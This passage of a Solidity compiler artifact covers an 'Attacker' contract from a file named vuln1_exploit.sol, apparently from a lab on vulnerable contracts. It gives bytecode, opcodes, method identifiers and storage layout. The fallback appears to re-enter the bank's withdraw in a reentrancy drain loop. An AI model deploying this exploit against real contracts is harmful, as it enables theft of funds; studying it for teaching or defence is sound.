a7d4d6002546040518263ffffffff1660e01b815260040161039791906103de565b5f604051808303815f87803b1580156103ae575f5ffd5b505af11580156103c0573d5f5f3e3d5ffd5b50505050565b5f819050919050565b6103d8816103c6565b82525050565b5f6020820190506103f15f8301846103cf565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61043961043461042f846103f7565b610416565b6103f7565b9050919050565b5f61044a8261041f565b9050919050565b5f61045b82610440565b9050919050565b61046b81610451565b82525050565b5f6020820190506104845f830184610462565b92915050565b5f610494826103f7565b9050919050565b6104a48161048a565b82525050565b5f6020820190506104bd5f83018461049b565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120455448000000000000000000000000005f82015250565b5f6105076013836104c3565b9150610512826104d3565b602082019050919050565b5f6020820190508181035f830152610534816104fb565b905091905056fea2646970667358221220bb2163ed5c92163aaf418e67fca0590ca05740869aa98d265b102c6527647f3464736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x6C9 CODESIZE SUB DUP1 PUSH2 0x6C9 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x3D SWAP2 SWAP1 PUSH2 0x120 JUMP JUMPDEST CALLER PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x14B JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xEF DUP3 PUSH2 0xC6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFF DUP2 PUSH2 0xE5 JUMP JUMPDEST DUP2 EQ PUSH2 0x109 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x11A DUP2 PUSH2 0xF6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x135 JUMPI PUSH2 0x134 PUSH2 0xC2 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x142 DUP5 DUP3 DUP6 ADD PUSH2 0x10C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x571 DUP1 PUSH2 0x158 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x123 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x139 JUMPI DUP1 PUSH4 0x88193565 EQ PUSH2 0x163 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x18D JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1B7 JUMPI PUSH2 0x11F JUMP JUMPDEST CALLDATASIZE PUSH2 0x11F JUMPI PUSH1 0x2 SLOAD PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x11D JUMPI PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEF SWAP2 SWAP1 PUSH2 0x3DE JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x106 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x118 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x137 PUSH2 0x1C1 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x144 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x14D PUSH2 0x227 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x15A SWAP2 SWAP1 PUSH2 0x471 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x16E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x177 PUSH2 0x24C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x184 SWAP2 SWAP1 PUSH2 0x3DE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x198 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1A1 PUSH2 0x252 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1AE SWAP2 SWAP1 PUSH2 0x4AA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1BF PUSH2 0x276 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x224 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD CALLVALUE LT ISZERO PUSH2 0x2BB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2B2 SWAP1 PUSH2 0x51D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x324 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x336 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x397 SWAP2 SWAP1 PUSH2 0x3DE JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3AE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3C0 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3D8 DUP2 PUSH2 0x3C6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3F1 PUSH0 DUP4 ADD DUP5 PUSH2 0x3CF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x439 PUSH2 0x434 PUSH2 0x42F DUP5 PUSH2 0x3F7 JUMP JUMPDEST PUSH2 0x416 JUMP JUMPDEST PUSH2 0x3F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x44A DUP3 PUSH2 0x41F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x45B DUP3 PUSH2 0x440 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x46B DUP2 PUSH2 0x451 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x484 PUSH0 DUP4 ADD DUP5 PUSH2 0x462 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x494 DUP3 PUSH2 0x3F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4A4 DUP2 PUSH2 0x48A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4BD PUSH0 DUP4 ADD DUP5 PUSH2 0x49B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312045544800000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x507 PUSH1 0x13 DUP4 PUSH2 0x4C3 JUMP JUMPDEST SWAP2 POP PUSH2 0x512 DUP3 PUSH2 0x4D3 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x534 DUP2 PUSH2 0x4FB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBB 0x21 PUSH4 0xED5C9216 GASPRICE 0xAF COINBASE DUP15 PUSH8 0xFCA0590CA0574086 SWAP11 0xA9 DUP14 0x26 JUMPDEST LT 0x2C PUSH6 0x27647F346473 PUSH16 0x6C634300081E00330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "278600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"attackAmount()": "2447",
						"bank()": "infinite",
						"owner()": "2551",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"attackAmount()": "88193565",
					"bank()": "76cdb03b",
					"owner()": "8da5cb5b",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 12,
						"contract": "vulncontracts/vuln1_exploit.sol:Attacker",
						"label": "owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 15,
						"contract": "vulncontracts/vuln1_exploit.sol:Attacker",
						"label": "bank",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(IVulnerableBank)10"
					},
					{
						"astId": 18,
						"contract": "vulncontracts/vuln1_exploit.sol:Attacker",
						"label": "attackAmount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(IVulnerableBank)10": {
						"encoding": "inplace",
						"label": "contract IVulnerableBank",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}